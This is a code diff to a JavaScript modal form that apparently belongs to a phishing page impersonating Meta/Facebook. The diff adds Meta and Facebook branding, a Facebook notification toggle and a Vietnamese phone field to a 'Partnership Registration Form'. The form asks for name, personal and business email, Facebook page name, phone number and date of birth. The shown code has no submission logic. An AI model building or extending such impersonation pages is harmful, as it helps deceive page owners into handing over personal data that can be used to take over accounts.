@@ -9,33 +9,71 @@ document.getElementById('submitRequestBtn').addEventListener('click', openClient
 // ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
     const content = `
-        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
+        <div class="flex items-center justify-between mb-5">
+            <h2 class="font-bold text-[17px]">Partnership Registration Form</h2>
+            <button type="button" onclick="Modal.close('clientModal')" class="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-500 text-xl leading-none">&times;</button>
+        </div>
         <form id="clientForm" class="space-y-3">
-            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-11 px-4 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-11 px-4 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-11 px-4 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-11 px-4 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+
+            <!-- Phone with flag + dial code -->
+            <div class="flex border border-[#d4dbe3] rounded-xl overflow-hidden bg-white h-11">
+                <div class="flex items-center gap-1 px-3 border-r border-[#d4dbe3] min-w-[80px] cursor-pointer select-none">
+                    <span class="text-lg">🇻🇳</span>
+                    <span class="text-sm text-gray-500">▾</span>
+                </div>
+                <div class="flex items-center px-2 text-sm text-gray-500 border-r border-[#d4dbe3]">+84</div>
+                <input type="tel" id="phone" placeholder="" class="flex-1 px-3 text-sm outline-none bg-white" required>
+            </div>
+
+            <!-- Date of Birth -->
             <div>
                 <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
                 <div class="grid grid-cols-3 gap-2">
-                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
-                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
+                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-11 px-3 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-11 px-3 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
+                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-11 px-3 rounded-xl text-sm focus:border-blue-500 outline-none bg-white" required>
                 </div>
             </div>
-            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
-            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
-            <div class="mt-[15px] mb-[20px]">
-                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
-                    <label class="inline-flex items-center cursor-pointer">
-                        <input type="checkbox">
-                    </label>
-                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
+
+            <textarea placeholder="Describe your issue" class="w-full border border-[#d4dbe3] h-[100px] px-4 py-3 rounded-xl text-sm resize-none outline-none bg-white"></textarea>
+
+            <p class="text-[#9a979e] text-[13px]">Our response will be sent to you within 14 - 48 hours.</p>
+
+            <!-- Facebook notification toggle -->
+            <div class="flex items-center justify-between bg-white border border-[#d4dbe3] rounded-xl px-4 py-3">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 bg-[#1877f2] rounded-full flex items-center justify-center">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg>
+                    </div>
+                    <div>
+                        <p class="text-sm font-semibold">on Facebook</p>
+                        <p class="text-xs text-[#9a979e]">We will send you a notification on Facebook.</p>
+                    </div>
+                </div>
+                <!-- Toggle switch -->
+                <label class="relative inline-flex items-center cursor-pointer">
+                    <input type="checkbox" id="fbToggle" class="sr-only peer" checked>
+                    <div class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:bg-[#1877f2] transition-colors after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:after:translate-x-5"></div>
                 </label>
             </div>
-            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
+
+            <!-- Terms checkbox -->
+            <div class="flex items-center gap-2">
+                <input type="checkbox" id="termsCheck" class="w-4 h-4 accent-[#1877f2] cursor-pointer" required>
+                <label for="termsCheck" class="text-sm cursor-pointer">
+                    I agree with <a href="#" class="text-[#0d6efd]">Terms of use ↗</a>
+                </label>
+            </div>
+
+            <button type="submit" class="w-full h-12 bg-[#0064E0] text-white rounded-full font-semibold hover:bg-blue-700 transition-colors text-[15px]">Send</button>
         </form>
+        <div class="flex items-center justify-center mt-5">
+            <img src="./public/icons/ic_meta_gray.svg" alt="Meta" class="h-5 opacity-60">
+        </div>
     `;
 
     Modal.create('clientModal', content);
@@ -264,4 +302,3 @@ function openSuccessModal() {
     Modal.create('successModal', content);
     Modal.open('successModal');
 }
-
